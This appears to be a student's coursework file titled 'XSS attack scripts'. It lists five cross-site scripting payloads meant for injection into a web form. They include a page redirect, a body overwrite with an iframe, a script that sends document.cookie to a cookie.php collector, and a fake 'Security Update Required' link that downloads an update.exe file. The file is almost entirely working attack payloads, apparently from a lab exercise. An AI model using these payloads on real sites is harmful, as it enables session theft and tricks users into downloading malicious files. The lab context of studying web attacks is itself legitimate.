
18BIT0032 HEMANT CHAUHAN
XSS ATTACK SCRIPTS:
This file is not for execution this is just having all the xss scripts that can be 
inserted into a textbox. 

1.
<script>window.location = "example.com"</script>



2.
<script>
document.body.innerHTML = "<iframe width=600px height=200px src = https://screenrec.com/share/kvowQX8Lp2?autoplay=1 allow autoplay>"
</script>


3.
<script>
  window.location = "http://localhost/XSS_DOS/XSS/cookie.php?cookie="+document.cookie
</script>

4.
<script>

  f = document.createElement("iframe")
  f.src = "http://localhost/XSS_DOS/XSS/18BIT0032.docx"
  document.body.appendChild(f)

</script>

5.
<a href = /update.exe download = update.exe
onclick = "if(window.el){return;}
el = this;
fetch('https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcQGXJ8Bl5yYWnCNCkKN6PFuFCYQmclemrjEsQ&usqp=CA').then(resp=>resp.blob())
.then(blob=>{el.href = window.URL.createObjectURL(blob);
el.click()});
return false">
Security Update Required
</a>





